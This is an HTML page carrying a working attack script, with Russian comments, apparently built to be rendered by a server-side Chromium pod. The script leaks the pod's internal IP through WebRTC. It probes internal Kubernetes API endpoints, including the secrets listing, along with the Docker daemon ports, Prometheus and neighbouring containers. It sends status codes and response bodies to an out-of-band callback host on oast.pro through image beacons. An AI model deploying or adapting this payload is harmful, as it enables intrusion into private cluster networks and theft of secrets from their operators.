<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}

fire('/alive10?t=0');

// 1. WebRTC ICE - внутренний IP Chromium-пода (обходит PNA и CORS)
(function() {
  try {
    var pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('x');
    pc.createOffer().then(function(o) { return pc.setLocalDescription(o); });
    pc.onicecandidate = function(e) {
      if (e && e.candidate && e.candidate.candidate) {
        fire('/rtc?c=' + encodeURIComponent(e.candidate.candidate.slice(0, 120)));
      }
    };
    setTimeout(function() { try { pc.close(); } catch(x) {} }, 4000);
  } catch(ex) {
    fire('/rtc-err?e=' + encodeURIComponent(ex.message.slice(0, 60)));
  }
})();

// 2. CORS fetch: если сервер вернёт ACAO:* — читаем тело напрямую
// Если вернёт HTTP без CORS-заголовков — быстрая ошибка (сервер ответил, данные есть)
// Если timeout — сервер вообще не отвечает на HTTP
function cf(label, url, ms) {
  var t0 = Date.now();
  fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
    .then(function(r) {
      return r.text().then(function(b) {
        fire('/cf-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status
          + '&b=' + encodeURIComponent(b.slice(0, 300)));
      });
    })
    .catch(function(e) {
      var elapsed = Date.now() - t0;
      var tag = elapsed >= ms - 150 ? 'to' : 'err';
      fire('/cf-' + tag + '-' + label + '?ms=' + elapsed
        + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
    });
}

// k8s insecure API port 8080 — с большим таймаутом (прошлый 2000мс мог не успеть)
cf('k8s-ver',        'http://10.96.0.1:8080/version',                                 8000);
cf('k8s-api',        'http://10.96.0.1:8080/api',                                     8000);
cf('k8s-secrets',    'http://10.96.0.1:8080/api/v1/secrets',                          8000);
cf('k8s-nodes',      'http://10.96.0.1:8080/api/v1/nodes',                            8000);

// k8s HTTPS: cert error (быстро) = TLS-сервер есть; timeout = нет сервера
cf('k8s-443',        'https://10.96.0.1/',                                             4000);
cf('k8s-6443',       'https://10.96.0.1:6443/',                                        4000);
cf('k8s-6443-ver',   'https://10.96.0.1:6443/version',                                4000);

// Docker host 172.17.0.1: сервисы, которые могут быть на хосте
cf('dkr-2375',       'http://172.17.0.1:2375/',                                        3000); // Docker API (insecure)
cf('dkr-2376',       'https://172.17.0.1:2376/',                                       3000); // Docker API (TLS)
cf('dkr-8080',       'http://172.17.0.1:8080/',                                        3000);
cf('dkr-9090',       'http://172.17.0.1:9090/',                                        3000); // Prometheus
cf('dkr-5000',       'http://172.17.0.1:5000/',                                        3000); // registry/flask
cf('dkr-6443',       'https://172.17.0.1:6443/',                                       3000);

// Сервис на 172.17.0.2, 172.17.0.3 (другие контейнеры в Docker-сети)
cf('dkr2-80',        'http://172.17.0.2/',                                             3000);
cf('dkr2-8080',      'http://172.17.0.2:8080/',                                        3000);
cf('dkr3-80',        'http://172.17.0.3/',                                             3000);
cf('dkr3-8080',      'http://172.17.0.3:8080/',                                        3000);
</script>
</body>
</html>
